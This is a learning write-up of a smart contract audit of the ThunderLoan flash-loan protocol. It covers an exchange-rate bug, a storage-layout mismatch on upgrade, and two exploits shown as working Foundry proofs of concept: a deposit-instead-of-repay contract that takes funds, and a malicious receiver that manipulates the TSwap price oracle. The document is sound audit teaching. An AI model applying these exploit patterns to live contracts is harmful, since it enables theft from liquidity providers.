> This Article Records My Learning Experience in Smart Contract Security Auditing Routine Checks

Before manual auditing, it is very necessary to scan the project using tools like Slither and Aderyn. Many issues can be detected by automated tools, which greatly reduce the workload of manual auditing. Do not hesitate to use these tools. Since their usage is straightforward and no significant issues were found, details are omitted here.

# Manual Audit

## Incorrect Timing of Exchange Rate Update

The article begins with two important functions in `ThunderLoan`: `deposit` and `redeem`. These are used for deposits and redemptions respectively. However, in `ThunderLoanTest.t.sol` there are tests only for `deposit` but none for `redeem`. The test logic is actually simple: just call `redeem` after performing a `FlashLoan`.

```javascript
    function testRedeem() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```

```shell
[FAIL: ERC20InsufficientBalance(0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c, 1000300000000000000000 [1e21], 1003300900000000000000 [1.003e21])] testRedeem() (gas: 1786921)
```

From the execution result, the actual `redeem` amount is slightly higher than expected. Since we only deposited `1000e18` to the contract, redeeming fails with an error. The key is the discrepancy between the actual and expected redeemed amount. According to the contract documentation, it is roughly as follows:

```shell
 Expected redeem amount: 1000.3e18 [1e21]
 Actual redeem amount: 1003.3009e18 [1.003e21]
 Actual ThunderLoan balance: 1000e18
```

In this example, an additional `9e14` fee is included. Since the fee update happens in `deposit`, this vulnerability will inevitably be triggered, causing the ThunderLoan fee to increase so much that even spending all the pool’s balance cannot redeem the full amount.

This coding appears to be erroneous because there is no comment in `deposit` clarifying why the fee is calculated during deposit. To fix this vulnerability, simply remove the following code:

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

## Incorrect revert Condition Causes Entire Balance Loss

At the end of the `flashloan` function, there is a condition:

```javascript
        uint256 endingBalance = token.balanceOf(address(assetToken));
        if (endingBalance < startingBalance + fee) {
            revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
        }
```

This logic itself is not wrong, but since the `deposit` function does not check whether a loan is ongoing, users can deposit during an active loan, artificially triggering this revert and causing a complete loss of balance.

The exploitation process is split into two parts: first, a contract is created whose main functions are to deposit and then attempt to redeem (triggering the vulnerability); second, the main test contract creates a function to execute the full exploit flow.

```javascript
contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address initiator, bytes calldata params) external returns (bool) {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}
```

```javascript
    function testDepositOverRepay() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        vm.stopPrank();

        dor.redeemMoney();

        console2.log("balance of dor is: ", tokenA.balanceOf(address(dor)));
        console2.log("balance of dor should be: ", 50e18 + fee);
        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }
```

```shell
Logs:
  balance of dor is:  50157185829891086986
  balance of dor should be:  50150000000000000000
```

The output shows `dor` has more than expected, confirming the vulnerability is correctly triggered.

## Don’t Arbitrarily Change Variable Order When Upgrading Contracts

The third critical vulnerability appears during `ThunderLoan` upgrade. A simple comparison of the variable declarations in `ThunderLoan.sol` and `ThunderLoanUpgraded.sol` reveals a severe issue:

```solidity
    // ThunderLoan.sol
    uint256 private constant s_feePrecision = 1e18;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    
    // ThunderLoanUpgraded.sol
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

Because the storage layout is fixed upon deployment, if the variable declaration order is changed during upgrade, variables’ actual values will misalign with their names, leading to unexpected runtime errors. The severity depends on the variable functionality. For `ThunderLoan`, it results in fee miscalculations.

```javascript
    function testUpgrade() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console2.log("fee before upgrade is: ", feeBeforeUpgrade);
        console2.log("fee after upgrade is: ", feeAfterUpgrade);
        assert(feeAfterUpgrade != feeBeforeUpgrade);
    }
```

```shell
Logs:
  fee before upgrade is:  3000000000000000
  fee after upgrade is:   1000000000000000000
```

From the logs, fee changed from `3e15` to `1e18`. This change is permanent after upgrade, causing all future loans to charge the higher fee, making it highly destructive.

## Price Oracle Manipulation

During manual audit of the `flashloan` function, it is found that `fee` is calculated via the internal `getCalculatedFee` function, which calls a function inside `TSwap`. This introduces the possibility of price oracle manipulation:

```solidity
    function flashloan(
    ...
        if (receiverAddress.code.length == 0) {
            revert ThunderLoan__CallerIsNotContract();
        }
        uint256 fee = getCalculatedFee(token, amount);
    ...
    function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
    }
    ...
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
        return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```

Imagine an attacker injects large amounts into the `TSwap` pool, manipulating its price ratio, thereby affecting the fee. `ThunderLoan` trusts `TSwap`’s calculation blindly.

The exploitation process might be:

*   Deploy a `TSwap` and fund it
    
*   Borrow tokens via `flashloan`
    
*   Swap borrowed `tokenA` to `weth` on `TSwap`
    
*   Borrow again to see the changed fee due to manipulated price
    

Example malicious receiver contract:

```solidity
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attack;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
        tswapPool = BuffMockTSwap(_tswapPool);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address initiator, bytes calldata params) external returns (bool) {
        if (!attack) {
            // Swap borrowed TokenA to WETH, then request another FlashLoan to demonstrate fee difference
            feeOne = fee;
            attack = true;
            uint256 wethBrought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBrought, block.timestamp);
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // Calculate fee and repay
            feeTwo = fee;
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}
```

Test demonstrating oracle manipulation:

```solidity
    function testOracleManipulation() public {
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));

        // Create WETH/TokenA pool using TSwap
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // Fund TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        // Pool now has 100 WETH and 100 TokenA = 1:1 ratio
        vm.stopPrank();

        // Deposit to ThunderLoan
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        // Pool still 100 WETH & 100 TokenA; ThunderLoan has 1000 TokenA
        vm.stopPrank();

        uint256 normalFee = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("normalFee is: ", normalFee);

        uint256 amountToBorrow = 50e18;
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console2.log("attackFee is: ", attackFee);
        assert(attackFee < normalFee);
    }
```

```shell
Logs:
  normalFee is:  296147410319118389
  attackFee is:  214167600932190305
```

Results show actual fee is much lower than expected due to price manipulation. However, as only the fee is affected and not the pool balance, the risk is medium at most.

# Summary

This contract audit is relatively difficult because of the abundant contract code and its integration with `TSwap`. Beyond exploit code, no suspicious detail or variable should be overlooked during auditing, as each line might unpredictably affect the contract.